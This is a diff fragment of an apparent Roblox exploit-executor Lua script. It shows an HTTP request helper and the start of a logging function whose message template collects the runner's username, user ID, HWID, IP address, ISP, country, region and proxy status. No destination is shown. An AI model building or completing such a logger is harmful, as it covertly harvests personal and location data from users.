@@ -15,7 +15,7 @@ local network_data = {
 }
 
 local http = (syn and syn.request) or (http and http.request) or request
-
+local a
 local function log_information(...)
 	local httpService = game:GetService("HttpService")
 	local data_string = "```ansi\n\27[2;30m\27[2;30m\27[2;36m\27[2;35m\27[2;36m// Identifier Data\27[0m\27[2;35m\27[0m\27[2;36m\27[0m\27[2;30m\27[0m\27[2;30m\27[0m\n\27[2;34mUsername\27[0m: \27[2;37m%s\27[0m\n\27[2;36m\27[2;34mUser Id \27[0m\27[2;36m\27[0m: \27[2;37m%s\27[0m\n\27[2;36m\27[2;34mExecutor\27[0m\27[2;36m\27[0m:\27[2;37m %s\27[0m\n\27[2;36m\27[2;34mHWID    \27[0m\27[2;36m\27[0m: \27[2;37m%s\27[0m\n\n\27[2;30m\27[2;36m// Location Data\27[0m\27[2;30m\27[0m\n\27[2;34mIP      \27[0m: \27[2;37m%s\27[0m\n\27[2;35m\27[2;36m\27[2;34mISP     \27[0m\27[2;36m\27[0m\27[2;35m\27[0m: \27[2;37m%s\27[0m\n\27[2;34mCountry \27[0m: \27[2;37m%s\27[0m\n\27[2;34mRegion  \27[0m: \27[2;37m%s\27[0m\n\27[2;34mProxy(\27[2;33m?\27[2;36m\27[2;34m)\27[2;36m\27[0m: \27[2;37m%s\27[0m\n\n\27[2;30m\27[2;36m// Action Data\27[0m\27[2;30m\27[0m\n\27[2;36m\27[2;31mTrigger \27[0m\27[2;36m\27[0m: \27[2;37m%s\n\27[2;31mDeviceID\27[0m\27[2;37m\27[0m: \27[2;37m%s\n\27[0m\27[2;37m\27[2;31mPayload \27[0m\27[2;37m\27[0m: \27[2;37m%s\27[0m\n\27[2;31mServer  \27[0m: \27[2;37m%s\27[0m\n```"
